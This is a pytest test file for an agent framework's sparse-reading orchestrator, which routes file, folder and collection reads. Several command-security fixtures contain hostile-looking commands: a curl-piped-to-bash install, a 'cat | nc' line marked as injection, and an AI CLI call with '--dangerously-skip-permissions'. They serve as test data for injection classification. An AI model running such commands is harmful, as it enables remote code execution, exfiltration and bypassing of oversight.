import asyncio
import json
from pathlib import Path
from types import SimpleNamespace

import pytest

from nanobot.agent.tools.filesystem import ReadFileTool
from nanobot.agent.tools.filesystem import WriteFileTool
from nanobot.agent.tools.filesystem import ListDirTool
from nanobot.agent.tools.shell import ExecTool
from nanobot.agent.tools.search import GrepTool
from nanobot.agent.runner import AgentRunSpec, AgentRunner
from nanobot.sparse_reading.orchestrator import SparseReadingOrchestrator
from nanobot.sparse_reading.policy import SparseCommandPolicy
from nanobot.sparse_reading.models import HintSpec
from nanobot.sparse_reading.tools import SroCardTool, SroReadTool


def _hint(**overrides):
    base = {
        "goal": "Find revenue and west region facts",
        "needles": ["revenue", "West"],
        "want": "fact",
        "scope": "new",
        "artifact": "",
        "type_hint": "auto",
        "must_keep": [],
    }
    base.update(overrides)
    return base


def _write_ready_audit_bundle(root: Path) -> Path:
    (root / "output").mkdir()
    (root / "config.yaml").write_text(
        "api:\n  max_pages: 3\n"
        "output:\n  csv_summary: true\n",
        encoding="utf-8",
    )
    (root / "fetch_state.json").write_text(
        json.dumps({"seen_ids": ["1", "2"]}),
        encoding="utf-8",
    )
    (root / "output" / "announcements_2026-02-09.json").write_text(
        json.dumps([{"announcementId": "2", "important": True, "secName": "Example", "announcementTitle": "Important"}]),
        encoding="utf-8",
    )
    source = root / "run_scheduled_fetch.py"
    source.write_text(
        "def deduplicate(announcements, state):\n"
        "    seen = set(state.get('seen_ids', []))\n"
        "    state['seen_ids'] = list(seen)[-5000:]\n"
        "def save_announcements(announcements, cfg):\n"
        "    save_csv_summary(announcements, '2026-02-09')\n",
        encoding="utf-8",
    )
    return source


def test_benefit_gate_core_decisions(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    sro = SparseReadingOrchestrator(tmp_path)

    pdf = tmp_path / "long_report.pdf"
    pdf.write_bytes(b"%PDF-1.4\n" + b"x" * 5000)
    assert sro.benefit_gate.decide(sro.inspect(pdf)).mode == "force_sro"

    pdf_workspace = tmp_path / "pdf_workspace"
    pdf_workspace.mkdir()
    (pdf_workspace / "openclaw_report.pdf").write_bytes(b"%PDF-1.4\n" + b"x" * 5000)
    assert sro.benefit_gate.decide(sro.inspect(pdf_workspace)).mode == "force_sro"
    assert not SparseReadingOrchestrator.disabled_for_low_sparse_workspace(pdf_workspace)

    audit = tmp_path / "audit_bundle"
    (audit / "output").mkdir(parents=True)
    (audit / "config.yaml").write_text("output:\n  csv_summary: true\n", encoding="utf-8")
    (audit / "fetch_state.json").write_text('{"seen_ids":["1"]}', encoding="utf-8")
    (audit / "output" / "announcements.json").write_text('[{"important": true}]', encoding="utf-8")
    (audit / "run_scheduled_fetch.py").write_text("print('fetch')\n", encoding="utf-8")
    assert sro.benefit_gate.decide(sro.inspect(audit)).mode == "force_sro"

    code = tmp_path / "plain_code"
    code.mkdir()
    (code / "main.py").write_text("print('hello')\n", encoding="utf-8")
    assert sro.benefit_gate.decide(sro.inspect(code)).mode != "force_sro"

    discount = tmp_path / "discount_bundle"
    discount.mkdir()
    (discount / "discount_rules.json").write_text('{"discount": 0.1}', encoding="utf-8")
    (discount / "users.csv").write_text("user_id,status\nu1,active\n", encoding="utf-8")
    assert sro.benefit_gate.decide(sro.inspect(discount)).mode == "native"

    forecast = tmp_path / "forecast_bundle"
    (forecast / "data").mkdir(parents=True)
    (forecast / "config").mkdir()
    (forecast / "data" / "rag_forecast_output.json").write_text('{"forecast_values":[1]}', encoding="utf-8")
    (forecast / "data" / "actual_future_values.csv").write_text("step,actual\n1,2\n", encoding="utf-8")
    (forecast / "data" / "baseline_forecasts.csv").write_text("step,baseline\n1,1\n", encoding="utf-8")
    (forecast / "config" / "analysis_parameters.json").write_text('{"normalization_factor":10}', encoding="utf-8")
    assert sro.benefit_gate.decide(sro.inspect(forecast)).mode == "native"

    did = tmp_path / "did_bundle"
    (did / "data").mkdir(parents=True)
    (did / "scripts").mkdir()
    (did / "data" / "panel_data.csv").write_text("firm_id,year,did\nF001,2020,1\n", encoding="utf-8")
    (did / "data" / "firm_metadata.csv").write_text("firm_id,industry\nF001,Manufacturing\n", encoding="utf-8")
    (did / "data" / "data_dictionary.json").write_text('{"ATT":3.5}', encoding="utf-8")
    (did / "scripts" / "did_regression.py").write_text("# regression script\n", encoding="utf-8")
    assert sro.benefit_gate.decide(sro.inspect(did)).mode == "native"

    query = tmp_path / "query_bundle"
    (query / "docs").mkdir(parents=True)
    (query / "config").mkdir()
    (query / "scripts").mkdir()
    (query / "docs" / "query_requirements.md").write_text("Use SPARQL and CONTAINS.\n", encoding="utf-8")
    (query / "docs" / "ontology_notes.md").write_text("Ontology notes.\n", encoding="utf-8")
    (query / "docs" / "sparql_examples.md").write_text("PREFIX : <http://example#>\n", encoding="utf-8")
    (query / "config" / "endpoint_config.yaml").write_text("endpoint: local\n", encoding="utf-8")
    (query / "scripts" / "load_data.sh").write_text("# load triplestore\n", encoding="utf-8")
    assert sro.benefit_gate.decide(sro.inspect(query)).mode == "native"

    emails = tmp_path / "emails"
    emails.mkdir()
    for idx in range(3):
        (emails / f"email_{idx}.txt").write_text(f"Subject: Project Alpha {idx}\n", encoding="utf-8")
    assert sro.benefit_gate.decide(sro.inspect(emails)).mode == "force_sro"


def test_sro_card_and_artifact_followup_for_csv(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    csv_path = tmp_path / "sales.csv"
    csv_path.write_text(
        "region,product,revenue\nWest,A,100\nEast,B,75\nWest,C,50\n",
        encoding="utf-8",
    )
    sro = SparseReadingOrchestrator(tmp_path)

    card = sro.card(csv_path)
    assert card.type == "csv"
    assert card.artifact_id.startswith("sro_")

    scout = sro.read({"path": str(csv_path)}, "scout", _hint(want="schema"))
    assert scout.artifact_id == card.artifact_id
    assert "columns" in scout.evidence[0].text

    focus = sro.read(
        {"artifact_id": card.artifact_id},
        "focus",
        _hint(artifact=card.artifact_id),
    )
    assert focus.artifact_id == card.artifact_id
    assert any("West" in block.text for block in focus.evidence)


def test_refine_requires_artifact(tmp_path):
    sro = SparseReadingOrchestrator(tmp_path)
    result = sro.read({"path": str(tmp_path / "missing.csv")}, "refine", _hint())
    assert result.error
    assert "artifact" in result.error


def test_text_reader_uses_direct_text_anchors(tmp_path):
    text_path = tmp_path / "README.md"
    text_path.write_text(
        "# Report\n\nIntro paragraph.\n\n## Findings\nThe gateway API is WebSocket and the benchmark proposes 12 tasks.\n",
        encoding="utf-8",
    )
    sro = SparseReadingOrchestrator(tmp_path)
    card = sro.card(text_path)
    pack = sro.read(
        {"artifact_id": card.artifact_id},
        "focus",
        _hint(
            goal="Find gateway API and task count",
            needles=["WebSocket", "12"],
            artifact=card.artifact_id,
            type_hint="text",
        ),
    )
    assert pack.type == "text"
    assert any(block.anchor.startswith("L") for block in pack.evidence)
    assert any("WebSocket" in block.text for block in pack.evidence)


def test_text_file_card_guides_multi_fact_collect(tmp_path):
    text_path = tmp_path / "report.md"
    text_path.write_text("Intro\n\n" + ("Long report text.\n" * 400), encoding="utf-8")
    sro = SparseReadingOrchestrator(tmp_path)

    card = sro.card(text_path)

    assert card.recommended_mode == "collect_if_multi_fact_else_scout"
    assert "collect+slots" in card.reason


def test_log_file_is_supported_text_artifact(tmp_path):
    log_path = tmp_path / "book_recommendation.log"
    log_path.write_text("2026-03-14 Telegram API 429 retry_after=3600\n" * 120, encoding="utf-8")
    sro = SparseReadingOrchestrator(tmp_path)

    card = sro.card(log_path)

    assert card.type == "text"
    assert card.sparse_recommended is True
    pack = sro.read(
        {"artifact_id": card.artifact_id},
        "focus",
        _hint(
            goal="Find Telegram 429 and retry_after value",
            needles=["429", "retry_after"],
            artifact=card.artifact_id,
            type_hint="text",
        ),
    )
    assert pack.evidence
    assert "retry_after=3600" in pack.evidence[0].text


def test_large_structured_read_defaults_to_native_advisory(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    path = tmp_path / "large.csv"
    path.write_text("a,b\n" + "\n".join(f"{i},{i}" for i in range(1000)), encoding="utf-8")
    sro = SparseReadingOrchestrator(tmp_path)
    tool = ReadFileTool(workspace=tmp_path, sro=sro)

    result = asyncio.run(tool.execute(path=str(path)))

    assert "sro_handoff" not in result
    assert "a,b" in result
    card = sro.card(path)
    assert card.recommended_mode == "sro_optional"
    assert not card.sparse_recommended


def test_read_file_long_pdf_hands_off(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    path = tmp_path / "report.pdf"
    path.write_bytes(b"%PDF-1.4\n" + b"x" * 5000)
    tool = ReadFileTool(workspace=tmp_path, sro=SparseReadingOrchestrator(tmp_path))

    result = asyncio.run(tool.execute(path=str(path)))

    payload = json.loads(result)
    assert payload["sro_handoff"] is True
    assert payload["file_card"]["type"] == "pdf"
    assert payload["file_card"]["recommended_mode"] == "collect_if_multi_fact_else_scout"


def test_collection_card_and_focus_then_verify(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    emails = tmp_path / "emails"
    emails.mkdir()
    (emails / "2026-01-15_project_alpha_kickoff.txt").write_text(
        "From: lead@example.com\n"
        "Date: Thu, 15 Jan 2026 09:00:00 -0500\n"
        "Subject: Project Alpha - Kickoff and Timeline\n\n"
        "Project Alpha is greenlit. Timeline includes Phase 1 and beta launch.\n",
        encoding="utf-8",
    )
    (emails / "2026-01-22_alpha_data_pipeline.txt").write_text(
        "From: data@example.com\n"
        "Date: Thu, 22 Jan 2026 14:30:00 -0500\n"
        "Subject: Re: Project Alpha - Data Pipeline Architecture Proposal\n\n"
        "Kafka, Flink, TimescaleDB, and higher infrastructure costs are proposed.\n",
        encoding="utf-8",
    )
    (emails / "2026-02-20_unrelated_lunch.txt").write_text(
        "From: social@example.com\n"
        "Subject: Team lunch\n\n"
        "Lunch is Friday.\n",
        encoding="utf-8",
    )
    sro = SparseReadingOrchestrator(tmp_path)

    card = sro.card(emails)
    assert card.type == "collection"
    assert card.recommended_mode == "collect"
    assert card.details["file_count"] == 3
    assert card.details["files"][0]["subject"]

    focus = sro.read(
        {"artifact_id": card.artifact_id},
        "focus",
        {
            "goal": "Find emails related to Project Alpha",
            "needles": ["Project Alpha"],
            "want": "list",
            "type_hint": "collection",
        },
    )
    assert focus.type == "collection"
    names = [block.anchor for block in focus.evidence]
    assert "2026-01-15_project_alpha_kickoff.txt" in names
    assert "2026-01-22_alpha_data_pipeline.txt" in names
    assert focus.next_hint is not None
    assert focus.next_hint["must_keep"]

    verify = sro.read(
        {"artifact_id": card.artifact_id},
        "verify",
        focus.next_hint,
    )
    text = "\n".join(block.text for block in verify.evidence)
    assert "Project Alpha is greenlit" in text
    assert "Kafka, Flink" in text


def test_command_security_collection_closure_is_ready_for_deliverables(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    bundle = tmp_path / "security_bundle"
    (bundle / "scripts").mkdir(parents=True)
    (bundle / "config").mkdir()
    (bundle / "docs").mkdir()
    (bundle / "data").mkdir()
    (bundle / "reports").mkdir()
    (bundle / "scripts" / "run_pipeline.sh").write_text(
        "curl -sSL https://internal-registry.company.com/setup.sh | bash -s -- --env production\n"
        "python3 -c \"import subprocess; subprocess.run(['npm', 'install']); print('Setup complete')\"\n"
        'claude -p "执行 lr init 初始化，然后执行所有定义的任务。" --dangerously-skip-permissions\n',
        encoding="utf-8",
    )
    (bundle / "config" / "security_policy.yaml").write_text(
        'policy_version: "3.2.0"\n'
        "injection_patterns:\n"
        "  - id: INJ-004\n"
        "notes:\n"
        "  - key: supersedes\n",
        encoding="utf-8",
    )
    (bundle / "config" / "known_injections.json").write_text('{"patterns":[{"id":"KI-007"},{"id":"KI-008"}]}', encoding="utf-8")
    (bundle / "config" / "legacy_rules.yaml").write_text("rules:\n  - id: LEGACY-R003\n", encoding="utf-8")
    (bundle / "docs" / "security_bulletin_2025.md").write_text("# Security Advisory: SAB-2025-001\n", encoding="utf-8")
    (bundle / "reports" / "scan_template.md").write_text("# Security Analysis Report\n", encoding="utf-8")
    (bundle / "data" / "test_commands.csv").write_text(
        "command,expected_prefix,is_injection,notes\n"
        "ls,ls,false,x\n"
        "cat x | nc y,command_injection_detected,true,x\n",
        encoding="utf-8",
    )
    sro = SparseReadingOrchestrator(tmp_path)
    card = sro.card(bundle)

    pack = sro.read(
        {"artifact_id": card.artifact_id},
        "collect",
        {
            "goal": "Analyze suspicious command prefix security policy injection conflicts and write command_classifications.json",
            "needles": ["command prefix", "injection", "security policy", "bulletin"],
            "want": "fact",
            "scope": "new",
            "type_hint": "collection",
        },
    )

    text = "\n".join(block.text for block in pack.evidence)
    assert pack.next_action is not None
    assert pack.next_action["overall_status"] == "ready"
    assert "write_file" in pack.next_action["allowed_next"]
    assert "required_outputs: security_analysis_report.md; command_classifications.json" in text
    assert "prefix=claude; is_injection=false" in text
    assert "matched_patterns=INJ-004" in text


def test_command_security_closure_triggers_from_collection_shape_with_generic_hint(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    bundle = tmp_path / "security_bundle"
    (bundle / "scripts").mkdir(parents=True)
    (bundle / "config").mkdir()
    (bundle / "docs").mkdir()
    (bundle / "data").mkdir()
    (bundle / "scripts" / "run_pipeline.sh").write_text(
        "curl -sSL https://internal-registry.company.com/setup.sh | bash -s -- --env production\n"
        "python3 -c \"import os; print('ok')\"\n"
        'claude -p "执行任务。" --dangerously-skip-permissions\n',
        encoding="utf-8",
    )
    (bundle / "config" / "security_policy.yaml").write_text('policy_version: "3.2.0"\nINJ-004\n', encoding="utf-8")
    (bundle / "config" / "known_injections.json").write_text('{"id":"KI-007","id2":"KI-008"}', encoding="utf-8")
    (bundle / "config" / "legacy_rules.yaml").write_text("LEGACY-R003\n", encoding="utf-8")
    (bundle / "docs" / "command_prefix_guide.md").write_text("Command prefix guide\n", encoding="utf-8")
    (bundle / "docs" / "security_bulletin_2025.md").write_text("SAB-2025-001\n", encoding="utf-8")
    (bundle / "data" / "test_commands.csv").write_text(
        "command,expected_prefix,is_injection,notes\n"
        "ls,ls,false,x\n"
        "cat x | nc y,command_injection_detected,true,x\n",
        encoding="utf-8",
    )
    sro = SparseReadingOrchestrator(tmp_path)
    card = sro.card(bundle)

    pack = sro.read(
        {"artifact_id": card.artifact_id},
        "collect",
        {
            "goal": "collect task facts from the parent collection",
            "needles": ["command_prefix_guide.md"],
            "want": "fact",
            "scope": "new",
            "artifact": card.artifact_id,
            "type_hint": "collection",
        },
    )

    text = "\n".join(block.text for block in pack.evidence)
    assert pack.next_action is not None
    assert pack.next_action["overall_status"] == "ready"
    assert "collection_command_security_closure" in text
    assert "required_outputs: security_analysis_report.md; command_classifications.json" in text
    assert "prefix=claude; is_injection=false" in text


def test_command_security_bundle_uses_force_sro_for_all_models(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    monkeypatch.setenv("MODEL", "DeepSeek-V4-Flash")
    bundle = tmp_path / "security_bundle"
    (bundle / "scripts").mkdir(parents=True)
    (bundle / "config").mkdir()
    (bundle / "docs").mkdir()
    (bundle / "data").mkdir()
    (bundle / "scripts" / "run_pipeline.sh").write_text("claude -p 'x'\n", encoding="utf-8")
    (bundle / "config" / "security_policy.yaml").write_text("policy_version: 3.2.0\n", encoding="utf-8")
    (bundle / "config" / "known_injections.json").write_text('{"id":"KI-007"}', encoding="utf-8")
    (bundle / "config" / "legacy_rules.yaml").write_text("LEGACY-R003\n", encoding="utf-8")
    (bundle / "docs" / "command_prefix_guide.md").write_text("Command prefix guide\n", encoding="utf-8")
    (bundle / "docs" / "security_bulletin_2025.md").write_text("SAB-2025-001\n", encoding="utf-8")
    (bundle / "data" / "test_commands.csv").write_text("command,expected_prefix,is_injection,notes\n", encoding="utf-8")
    sro = SparseReadingOrchestrator(tmp_path)

    decision = sro.benefit_gate.decide(sro.inspect(bundle))

    # Command-security bundles now use force_sro for all models (model-specific native bypass removed)
    assert decision.mode == "force_sro"
    assert decision.action == "intercept"
    assert sro.should_handoff_list(bundle)


def test_force_collection_child_handoff_targets_parent_collection(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    bundle = tmp_path / "security_bundle"
    (bundle / "docs").mkdir(parents=True)
    (bundle / "scripts").mkdir()
    (bundle / "docs" / "command_prefix_guide.md").write_text("Command prefix guide\n" * 500, encoding="utf-8")
    (bundle / "docs" / "security_bulletin_2025.md").write_text("SAB-2025-001\n", encoding="utf-8")
    (bundle / "docs" / "scan_template.md").write_text("Security analysis template\n", encoding="utf-8")
    (bundle / "scripts" / "run_pipeline.sh").write_text("claude -p \"执行任务\" --dangerously-skip-permissions\n", encoding="utf-8")
    sro = SparseReadingOrchestrator(tmp_path)
    tool = ReadFileTool(workspace=tmp_path, sro=sro)

    result = asyncio.run(tool.execute(path="security_bundle/docs/command_prefix_guide.md"))

    payload = json.loads(result)
    assert payload["sro_handoff"] is True
    assert payload["file_card"]["type"] == "collection"
    assert payload["next_action"]["target"]["artifact_id"] == payload["file_card"]["artifact_id"]
    assert payload["next_action"]["mode"] == "collect"


def test_list_dir_collection_hands_off(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    emails = tmp_path / "emails"
    emails.mkdir()
    for idx in range(3):
        (emails / f"email_{idx}.txt").write_text(
            f"Subject: Project Alpha update {idx}\n\nBody {idx}\n",
            encoding="utf-8",
        )
    tool = ListDirTool(workspace=tmp_path, sro=SparseReadingOrchestrator(tmp_path))

    result = asyncio.run(tool.execute(path="emails"))

    payload = json.loads(result)
    assert payload["sro_handoff"] is True
    assert payload["file_card"]["type"] == "collection"
    assert payload["next_action"]["mode"] == "collect"


def test_read_file_child_of_advisory_collection_stays_native(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    (tmp_path / "bundle").mkdir()
    (tmp_path / "bundle" / "config.yaml").write_text("fetch:\n  retry: true\n", encoding="utf-8")
    child = tmp_path / "bundle" / "run_scheduled_fetch.py"
    child.write_text("print('x')\n" * 500, encoding="utf-8")
    sro = SparseReadingOrchestrator(tmp_path)
    card = sro.card(tmp_path / "bundle")
    assert card.recommended_mode == "sro_optional"
    tool = ReadFileTool(workspace=tmp_path, sro=sro)

    result = asyncio.run(tool.execute(path="bundle/run_scheduled_fetch.py"))

    assert "sro_handoff" not in result
    assert "print('x')" in result


def test_small_discount_bundle_is_native_but_card_keeps_metadata(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    bundle = tmp_path / "discount_task"
    bundle.mkdir()
    (bundle / "discount_rules.json").write_text(
        '{"tiers": [{"name": "gold", "discount": 0.15}], "cap": 0.25, "inactive": 0}',
        encoding="utf-8",
    )
    (bundle / "users.csv").write_text(
        "user_id,status,tier,loyalty_years\nu1,active,gold,4\nu2,inactive,silver,2\n",
        encoding="utf-8",
    )
    (bundle / "catalog_promo.txt").write_text(
        "Spring promo unrelated to the user discount rules.\n",
        encoding="utf-8",
    )
    sro = SparseReadingOrchestrator(tmp_path)

    card = sro.card(bundle)

    assert card.type == "collection"
    assert card.recommended_mode == "native_read"
    assert not card.sparse_recommended
    assert {item["name"] for item in card.details["files"]} >= {"discount_rules.json", "users.csv"}
    kinds = {item["name"]: item["kind"] for item in card.details["files"]}
    assert kinds["discount_rules.json"] == "json"
    assert kinds["users.csv"] == "csv"

    focus = sro.read(
        {"artifact_id": card.artifact_id},
        "focus",
        {
            "goal": "Select files needed to compute per-user discounts from rules and users",
            "needles": ["discount rules", "users", "inactive", "cap"],
            "want": "list",
            "type_hint": "collection",
        },
    )

    assert focus.summary.startswith("low-sparse fallback")
    assert focus.evidence == []


def test_native_discount_bundle_does_not_handoff_or_guard_children(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    (tmp_path / "data").mkdir()
    (tmp_path / "config").mkdir()
    (tmp_path / "docs").mkdir()
    (tmp_path / "data" / "discount_rules.json").write_text(
        json.dumps(
            {
                "tier_discounts": {
                    "bronze": {"base_discount_pct": 0, "min_orders": 0},
                    "silver": {"base_discount_pct": 5, "min_orders": 5},
                    "gold": {"base_discount_pct": 10, "min_orders": 20},
                },
                "loyalty_bonus": {"enabled": True, "years_threshold": 2, "bonus_pct": 3},
                "spending_bonus": {
                    "enabled": True,
                    "thresholds": [
                        {"min_spent": 1000, "bonus_pct": 2},
                        {"min_spent": 3000, "bonus_pct": 5},
                    ],
                },
                "max_discount_pct": 25,
                "inactive_user_eligible": False,
            }
        ),
        encoding="utf-8",
    )
    (tmp_path / "data" / "users.csv").write_text(
        "user_id,name,membership_tier,signup_date,total_spent,order_count,is_active\n"
        "USR-1,Ada,gold,2022-01-01,3000,20,True\n",
        encoding="utf-8",
    )
    (tmp_path / "data" / "product_catalog.csv").write_text("sku,price\nA,10\n", encoding="utf-8")
    (tmp_path / "config" / "promotion_schedule.json").write_text('{"coupon_codes":{"SAVE":10}}', encoding="utf-8")
    (tmp_path / "docs" / "discount_policy.md").write_text("JSON is the source of truth.\n", encoding="utf-8")
    sro = SparseReadingOrchestrator(tmp_path)
    card = sro.card(tmp_path)
    assert card.recommended_mode == "native_read"
    assert not card.sparse_recommended

    tool = ListDirTool(workspace=tmp_path, sro=sro)
    listing = asyncio.run(tool.execute(path=str(tmp_path), recursive=True))
    assert "sro_handoff" not in listing

    pack = sro.read(
        {"artifact_id": card.artifact_id},
        "collect",
        {
            "goal": "Build a reusable discount calculator script from discount rules and users.csv rows",
            "needles": ["discount_rules.json contents", "users.csv all rows", "promotion_schedule.json contents"],
            "want": "fact",
            "scope": "expand",
            "type_hint": "collection",
        },
    )

    assert pack.summary.startswith("low-sparse fallback")
    assert "native read listed files" in pack.next_action["allowed_next"]

    reader = ReadFileTool(workspace=tmp_path, sro=sro)
    child_read = asyncio.run(reader.execute(path="data/discount_rules.json"))
    assert "sro_guard" not in child_read
    assert "tier_discounts" in child_read

    generated = tmp_path / "discount_calculator.py"
    generated.write_text("def calculate_discount(row):\n    return 0\n", encoding="utf-8")
    assert not sro.should_handoff_read(generated)

    policy = SparseCommandPolicy(sro)
    assert policy.guard(f"cp {tmp_path / 'data' / 'discount_rules.json'} /tmp/rules.json", str(tmp_path)) is None


def test_recursive_forecast_workspace_without_baseline_is_advisory(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    (tmp_path / "data").mkdir()
    (tmp_path / "config").mkdir()
    (tmp_path / "sessions").mkdir()
    (tmp_path / "data" / "rag_forecast_output.json").write_text(
        '{"sensor_id":"S-4021","forecast_values":[111.3]}',
        encoding="utf-8",
    )
    (tmp_path / "data" / "actual_future_values.csv").write_text(
        "step,actual_flow\n1,126.0\n",
        encoding="utf-8",
    )
    (tmp_path / "config" / "analysis_parameters.json").write_text(
        '{"normalization_factor": 10}',
        encoding="utf-8",
    )
    (tmp_path / "sessions" / "old.jsonl").write_text(
        '{"role":"assistant","content":"noise"}\n',
        encoding="utf-8",
    )
    sro = SparseReadingOrchestrator(tmp_path)
    tool = ListDirTool(workspace=tmp_path, sro=sro)

    result = asyncio.run(tool.execute(path=str(tmp_path), recursive=True))
    assert "sro_handoff" not in result
    assert "data/rag_forecast_output.json" in result
    assert "data/actual_future_values.csv" in result
    assert "sessions/old.jsonl" not in result

    card = sro.card(tmp_path)
    assert card.recommended_mode == "sro_optional"
    assert not sro.should_handoff_read(tmp_path / "config" / "analysis_parameters.json")


def test_large_csv_card_includes_schema_but_does_not_force_handoff(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    (tmp_path / "data").mkdir()
    (tmp_path / "data" / "panel_data.csv").write_text(
        "firm_id,year,treated,post,did,revenue_growth_pct\n"
        + "\n".join(f"F{i:03d},2020,1,1,1,{i}" for i in range(400)),
        encoding="utf-8",
    )
    sro = SparseReadingOrchestrator(tmp_path)

    card = sro.card(tmp_path / "data" / "panel_data.csv")

    assert card.type == "csv"
    assert card.recommended_mode == "sro_optional"
    assert not sro.should_handoff_read(tmp_path / "data" / "panel_data.csv")
    assert card.details["row_count"] == 400
    assert card.details["columns"] == [
        "firm_id", "year", "treated", "post", "did", "revenue_growth_pct",
    ]


def test_small_structured_file_uses_native_read(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    path = tmp_path / "data_dictionary.json"
    path.write_text('{"true_att": 3.5, "rows": 300}', encoding="utf-8")
    sro = SparseReadingOrchestrator(tmp_path)

    assert not sro.should_handoff_read(path)


def test_collection_collect_returns_source_keyed_excerpts(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    (tmp_path / "data").mkdir()
    (tmp_path / "config").mkdir()
    (tmp_path / "logs").mkdir()
    (tmp_path / "data" / "actual_future_values.csv").write_text(
        "step,actual_flow\n1,126.0\n2,122.0\n",
        encoding="utf-8",
    )
    (tmp_path / "config" / "analysis_parameters.json").write_text(
        '{"normalization_factor": 10, "unit": "vehicles_per_5min_divided_by_10"}',
        encoding="utf-8",
    )
    (tmp_path / "logs" / "book_recommendation.log").write_text(
        "2026-03-14 ERROR Telegram API 429 retry_after=3600\n",
        encoding="utf-8",
    )
    sro = SparseReadingOrchestrator(tmp_path)
    card = sro.card(tmp_path)
    assert not sro.should_handoff_list(tmp_path)
    assert card.recommended_mode == "sro_optional"

    pack = sro.read(
        {"artifact_id": card.artifact_id},
        "collect",
        {
            "goal": "Analyze forecast actuals and diagnose retry configuration facts",
            "needles": ["actuals", "normalization_factor", "retry_after"],
            "want": "fact",
            "type_hint": "collection",
        },
    )

    text = "\n".join(block.text for block in pack.evidence)
    assert "collection excerpt digest" in pack.summary
    assert "data/actual_future_values.csv" in text
    assert "actual_flow" in text
    assert "normalization_factor" in text
    assert "retry_after" in text or "3600" in text
    assert pack.next_action is not None
    assert "write_file" in pack.next_action["allowed_next"]


def test_collection_collect_adds_diagnostic_closure(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    (tmp_path / "config").mkdir()
    (tmp_path / "logs").mkdir()
    (tmp_path / "scripts").mkdir()
    (tmp_path / "config" / "task_scheduler.yaml").write_text(
        "schedule: 0 9 * * *\ntimezone: Asia/Shanghai\nretry:\n  delay_seconds: 300\n"
        "delivery:\n  fallback_channel: discord\n",
        encoding="utf-8",
    )
    (tmp_path / "config" / "messaging.yaml").write_text(
        "providers:\n  telegram:\n    rate_limit:\n      messages_per_second: 1\n",
        encoding="utf-8",
    )
    (tmp_path / "logs" / "book_recommendation.log").write_text(
        "2026-03-05 INFO ok\n"
        "2026-03-08 INFO ok\n"
        "2026-03-09 ERROR Telegram API error retry_after=3600\n"
        + "padding\n" * 2000,
        encoding="utf-8",
    )
    (tmp_path / "scripts" / "send_book_recommendation.py").write_text(
        "def send_message(message, channel='telegram'):\n"
        "    print(message)\n"
        "    return True\n",
        encoding="utf-8",
    )
    sro = SparseReadingOrchestrator(tmp_path)
    card = sro.card(tmp_path)
    hint, errors = HintSpec.from_obj(
        {
            "goal": "Diagnose why scheduled notification failed",
            "needles": ["retry_after", "fallback", "rate_limit"],
            "want": "fact",
            "type_hint": "collection",
        },
    )
    assert hint is not None
    assert not errors

    pack = sro.collection_reader.read(
        tmp_path,
        card.artifact_id,
        "collect",
        hint,
        budget=20_000,
    )

    closure = next(block.text for block in pack.evidence if block.anchor == "collection_diagnosis_closure")
    assert "retry_after=3600" in closure
    assert "delay_seconds=300" in closure
    assert "missing_dates=2026-03-06, 2026-03-07" in closure
    assert "fallback_channel=discord" in closure
    assert "script_reads_or_enforces_rate_limit=False" in closure


def test_collection_collect_adds_audit_closure(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    (tmp_path / "output").mkdir()
    (tmp_path / "config.yaml").write_text(
        "api:\n  max_pages: 3\n  fetch_sse: true\n  request_delay: 1.5\n  category: ''\n"
        "output:\n  csv_summary: true\n  retention_days: 30\n"
        "notifications:\n  enabled: false\n",
        encoding="utf-8",
    )
    (tmp_path / "fetch_state.json").write_text(
        json.dumps(
            {
                "last_fetch_ts": "2026-02-09T17:16:02.384192",
                "seen_ids": ["1256789401", "1256789520", "1256789535"],
            }
        ),
        encoding="utf-8",
    )
    (tmp_path / "output" / "announcements_2026-02-09.json").write_text(
        json.dumps(
            [
                {
                    "announcementId": "1256789520",
                    "secCode": "000001",
                    "secName": "Ping An Bank",
                    "announcementTitle": "2025 Annual Results Pre-announcement",
                    "announcementType": "01010503",
                    "important": True,
                },
                {
                    "announcementId": "1256789535",
                    "secCode": "601318",
                    "secName": "Ping An Insurance",
                    "announcementTitle": "January 2026 Premium Income Announcement",
                    "announcementType": "010501",
                    "important": True,
                },
            ]
        ),
        encoding="utf-8",
    )
    (tmp_path / "run_scheduled_fetch.py").write_text(
        "def deduplicate(announcements, state):\n"
        "    seen = set(state.get('seen_ids', []))\n"
        "    state['seen_ids'] = list(seen)[-5000:]\n\n"
        "def save_announcements(announcements, cfg):\n"
        "    if cfg.get('output', {}).get('csv_summary', False):\n"
        "        save_csv_summary(announcements, '2026-02-09')\n",
        encoding="utf-8",
    )
    sro = SparseReadingOrchestrator(tmp_path)
    card = sro.card(tmp_path)

    pack = sro.read(
        {"artifact_id": card.artifact_id},
        "collect",
        {
            "goal": "Audit fetch state vs output, code bugs, missing outputs, and important announcements",
            "needles": ["seen_ids", "csv_summary", "deduplicate", "important"],
            "want": "fact",
            "type_hint": "collection",
        },
    )

    closure = next(block.text for block in pack.evidence if block.anchor == "collection_audit_closure")
    assert [block.anchor for block in pack.evidence] == ["collection_audit_closure"]
    assert pack.next_action["allowed_next"] == ["write_file"]
    assert pack.slot_digest is not None
    assert pack.slot_digest["overall_status"] == "ready"
    assert pack.slot_digest["allowed_next"] == ["write_file"]
